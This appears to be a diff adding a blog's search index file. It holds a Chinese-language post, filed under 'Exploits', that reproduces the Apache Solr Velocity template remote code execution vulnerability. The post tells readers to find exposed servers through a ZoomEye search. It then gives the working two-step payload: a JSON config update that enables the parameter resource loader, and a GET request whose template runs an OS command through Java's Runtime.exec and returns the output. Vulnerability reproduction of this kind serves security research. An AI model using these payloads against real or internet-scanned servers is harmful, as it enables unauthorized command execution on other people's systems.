@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Apache Solr Velocity模板远程代码执行漏洞复现</title>
+      <link href="/2019/11/01/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2019/11/01/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Apache-Solr描述"><a href="#Apache-Solr描述" class="headerlink" title="Apache Solr描述"></a>Apache Solr描述</h2><p>Solr（读作“solar”）是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。Solr是高度可扩展的，并提供了分布式搜索和索引复制。<br>Solr是用Java编写、运行在Servlet容器（如Apache Tomcat或Jetty）的一个独立的全文搜索服务器。 Solr采用了Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。 Solr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>近日,国外安全研究员s00py公开了一个Apache Solr的Velocity模板注入的漏洞.该漏洞可以攻击最新版本的Solr.目前该漏洞利用详情已经广泛流传于Github以及各大安全群,且公开的EXP可以执行任意命令并自带回显.官方暂未发布补丁.</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>≤8.2.0(目前最新版本)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>Apache Solr下载地址:<a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip" target="_blank" rel="noopener">solr-8.0.2.zip</a></li><li>基于docker:  <ol><li><code>docker pull solr</code>  </li><li><code>docker run --name my-solr -d -p 8983:8983 -t solr</code></li></ol></li><li>zoomeye:<br>  zoomeye搜索<code>port:8983 +app:&quot;Apache Solr&quot;</code><br>  <img src="http://img.osshell.com/20191101160658.png" alt=""><br>  图中可以看到HTTP显示的状态码为<code>302</code>状态码,这是由于solr默认访问ip后均会跳转到solr目录.<br>  打开后可以看到是正常的solr界面:<br>  <img src="http://img.osshell.com/20191101161114.png" alt=""></li></ul><h3 id="POC复测"><a href="#POC复测" class="headerlink" title="POC复测"></a>POC复测</h3><ol><li>首先我们要获取到solr的其中任意一个core名,可以通过以下两种方法:<ul><li>通过Logging报错</li><li>通过左下方的Core Selector<br><img src="http://img.osshell.com/20191101161537.png" alt=""></li></ul></li><li>获取core名称后访问<code>solr/core-name/config</code>确认config可以访问</li><li><img src="http://img.osshell.com/20191101161843.png" alt=""></li><li>向<code>solr/core-name/config</code>发送POST数据包,payload如下: </li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"update-queryresponsewriter"</span>: &#123;</span><br><span class="line">    <span class="attr">"startup"</span>: <span class="string">"lazy"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"velocity"</span>,</span><br><span class="line">    <span class="attr">"class"</span>: <span class="string">"solr.VelocityResponseWriter"</span>,</span><br><span class="line">    <span class="attr">"template.base.dir"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"solr.resource.loader.enabled"</span>: <span class="string">"true"</span>,</span><br><span class="line">    <span class="attr">"params.resource.loader.enabled"</span>: <span class="string">"true"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>查看<code>solr/core-name/config</code>确认<code>params.resource.loader.enabled</code>的值已经修改为<code>true</code></li><li>发送get请求执行命令,payload如下:<br> <code>/solr/merchant/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ls%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code><br> 命令执行成功返回结果:<br> <img src="http://img.osshell.com/20191101170730.png" alt=""></li></ol><h3 id="更多参考"><a href="#更多参考" class="headerlink" title="更多参考"></a>更多参考</h3><ol><li><a href="https://nosec.org/home/detail/3113.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3113.html</a></li><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploits </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Apache </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
